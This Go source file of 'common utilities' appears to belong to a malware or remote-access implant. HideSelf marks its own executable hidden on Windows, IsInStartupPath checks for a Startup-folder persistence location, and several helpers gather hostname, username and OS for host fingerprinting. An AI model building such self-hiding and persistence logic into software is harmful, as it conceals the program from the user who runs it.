// ============================================================
// common.go - Common Utilities
// ============================================================
package common

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

// IsAlreadyRunning checks if another instance is running
func IsAlreadyRunning() bool {
	// In production, use mutex or process checking
	return false
}

// HideSelf hides the current executable
func HideSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	
	if runtime.GOOS == "windows" {
		exec.Command("attrib", "+h", exe).Run()
	}
}

// IsInStartupPath checks if the executable is in startup
func IsInStartupPath() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	startupPath := filepath.Join(os.Getenv("APPDATA"),
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	
	exe, _ := os.Executable()
	return filepath.Dir(exe) == startupPath
}

// GetHostname returns the hostname
func GetHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

// GetUsername returns the username
func GetUsername() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

// GetOS returns the operating system
func GetOS() string {
	return runtime.GOOS + " " + runtime.GOARCH
}

// IsWindows returns true if running on Windows
func IsWindows() bool {
	return runtime.GOOS == "windows"
}